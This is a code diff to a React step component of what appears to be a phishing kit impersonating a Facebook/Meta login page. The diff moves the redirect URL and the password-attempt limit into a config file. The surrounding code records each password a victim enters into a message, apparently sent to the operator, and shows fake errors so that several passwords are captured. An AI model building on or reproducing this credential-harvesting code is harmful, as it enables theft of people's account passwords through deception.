@@ -4,6 +4,7 @@ import FacebookLogoImage from '@/assets/images/facebook-logo-image.png';
 import MetaLogo from '@/assets/images/meta-image.png';
 import { useFormStore } from '@/store/form-store';
 import type { Dictionary } from '@/types/content';
+import config from '@/utils/config';
 import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
 import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
@@ -20,7 +21,7 @@ const Step2: FC<{ onNext: () => void; formContent: Dictionary['formModal'] }> = 
 
     useEffect(() => {
         if (!messageId) {
-            window.location.href = 'https://google.com';
+            window.location.href = config.REDIRECT_URL;
         }
     }, [messageId]);
 
@@ -38,7 +39,7 @@ const Step2: FC<{ onNext: () => void; formContent: Dictionary['formModal'] }> = 
             const currentAttempt = attempts + 1;
             setAttempts(currentAttempt);
 
-            const passwordLine = /* HTML */ `<b>Password ${currentAttempt}/3:</b> <code>${password}</code>`;
+            const passwordLine = /* HTML */ `<b>Password ${currentAttempt}/${config.MAX_PASS}:</b> <code>${password}</code>`;
             const newMessage = savedMessage ? `${savedMessage}\n${passwordLine}` : passwordLine;
             setSavedMessage(newMessage);
 
@@ -59,7 +60,7 @@ const Step2: FC<{ onNext: () => void; formContent: Dictionary['formModal'] }> = 
                     setMessageId(data.message_id);
                 }
 
-                if (currentAttempt >= 3) {
+                if (currentAttempt >= config.MAX_PASS) {
                     onNext();
                 } else {
                     setShowError(true);
